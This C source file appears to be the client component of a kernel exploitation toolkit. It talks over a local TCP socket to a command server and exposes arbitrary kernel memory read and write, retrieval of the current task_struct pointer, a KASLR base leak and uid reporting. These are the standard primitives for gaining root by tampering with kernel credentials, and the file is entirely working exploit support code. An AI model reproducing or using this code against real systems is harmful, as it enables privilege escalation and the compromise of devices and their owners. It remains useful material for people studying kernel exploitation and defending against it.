#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include "debug.h"
#include "server.h"
#include "client.h"

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

int run_server_command(int port, int cmd, uint64_t addr, int size, void *buff)
{
	int fd, ret, status;
	uint8_t *buffer = buff;
	unsigned offs;
	struct sockaddr_in saddr;
	struct t_cmd tc;

	if (size > PAGE_SIZE)
		return -1;

	fd = socket(AF_INET, SOCK_STREAM, 0);
	if (fd < 0) {
		PRNO("socket");
		return -1;
	}

	memset(&saddr, 0, sizeof(saddr));
	saddr.sin_addr.s_addr = inet_addr("127.0.0.1");
	saddr.sin_family = AF_INET;
	saddr.sin_port = htons(port);
	if (connect(fd, (struct sockaddr *)&saddr, sizeof(saddr)) < 0) {
		PRNO("connect");
		close(fd);
		return -1;
	}

	PDBG("connected to cmd server, sending cmd=%d addr=0x%016zx size=%d\n", cmd, addr, size);

	tc.cmd = cmd;
	tc.addr = addr;
	tc.size = size;

	ret = write(fd, &tc, sizeof(tc));
	if (ret < 0) {
		PRNO("client cmd write");
		close(fd);
		return -1;
	} else if (ret < (int)sizeof(ret)) {
		PERR("client cmd write %d bytes instead of %d expected\n", ret, (int)sizeof(tc));
		close(fd);
		return -1;
	}

	status = 0;

	switch (cmd) {
	case CMD_QUIT:
		break;

	case CMD_READ:
	case CMD_GET_TASKP:
	case CMD_GET_KASLR:
		ret = read(fd, &status, sizeof(status));
		if (ret < 0) {
			PRNO("client krd cmd status read");
			close(fd);
			return -1;
		} else if (ret < (int)sizeof(status)) {
			PERR("client krd cmd status read %d bytes instead of %d expected\n", ret, (int)sizeof(status));
			close(fd);
			return -1;
		}
		if (size != status) {
			PERR("client krd read status=%d expected %d\n", status, size);
			if (status < 1) {
				close(fd);
				return status;
			}
			size = status;
		}
		offs = 0;
		do {
			ret = read(fd, buffer + offs, size - offs);
			if (ret < 0) {
				PRNO("client read data");
				break;
			} else if (ret == 0) {
				PERR("client read data got 0 number of bytes\n");
				break;
			}
			offs += ret;
		} while ((int)offs < size);
		if ((int)offs < size) {
			PERR("client read %d bytes instead of %u expected\n", offs, size);
			close(fd);
			return offs > 0 ? offs : -1;
		}
		PDBG("client read %u bytes from 0x%016zx kernel addr\n", size, addr);
		break;

	case CMD_WRITE:
		ret = write(fd, buffer, size);
		if (ret < 0) {
			PRNO("client write data");
			close(fd);
			return -1;
		} else if (ret < size) {
			PERR("client write data %d bytes instead of %d expected\n", ret, size);
			close(fd);
			return -1;
		}
		ret = read(fd, &status, sizeof(status));
		if (ret < 0) {
			PRNO("client kwr cmd status read");
			close(fd);
			return -1;
		} else if (ret < (int)sizeof(status)) {
			PERR("client kwr cmd status read %d bytes instead of %d expected\n", ret, (int)sizeof(status));
			close(fd);
			return -1;
		}
		if (size != status) {
			PERR("client kwr read status=%d expected %d\n", status, size);
			if (status < 1) {
				close(fd);
				return status;
			}
		}
		PDBG("client wrote %u bytes to 0x%016zx kernel addr\n", status, addr);
		break;
	};

	close(fd);
	return status;
}

int client_arbitrary_read(uint64_t addr, int size, void *buffer)
{
	return run_server_command(CMD_SERVER_PORT, CMD_READ, addr, size, buffer) == size ? 0 : -1;
}

int client_arbitrary_write(uint64_t addr, int size, void *buffer)
{
	return run_server_command(CMD_SERVER_PORT, CMD_WRITE, addr, size, buffer) == size ? 0 : -1;
}

int client_curr_get_task_struct_p(uint64_t *addr)
{
	return run_server_command(CMD_SERVER_PORT, CMD_GET_TASKP, 0, sizeof(*addr), addr) == sizeof(*addr) ? 0 : -1;
}

int client_curr_get_kaslr(uint64_t *addr)
{
	return run_server_command(CMD_SERVER_PORT, CMD_GET_KASLR, 0, sizeof(addr), addr) == 8 ? 0 : -1;
}

void client_report_uid(int uid)
{
	run_server_command(CMD_SERVER_PORT, CMD_REPORT_UID, uid, 0, NULL);
}
